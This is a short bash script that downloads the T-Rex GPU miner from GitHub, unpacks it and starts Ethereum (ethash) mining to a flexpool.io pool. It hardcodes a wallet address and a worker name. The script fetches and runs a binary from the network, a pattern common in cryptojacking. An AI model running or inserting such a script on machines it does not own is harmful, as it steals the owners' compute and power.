#! /bin/bash
wget https://github.com/trexminer/T-Rex/releases/download/0.19.12/t-rex-0.19.12-linux-cuda11.1.tar.gz
tar -xvf t-rex-0.19.12-linux-cuda11.1.tar.gz
rm -f t-rex-0.19.12-linux-cuda11.1.tar.gz
cd bin && ./t-rex -a ethash -o stratum+ssl://eth-us-east.flexpool.io:5555 -u 0x7cbcF570cE273d033AA314eeEa4eFF387a618976 -p x -w vulturous
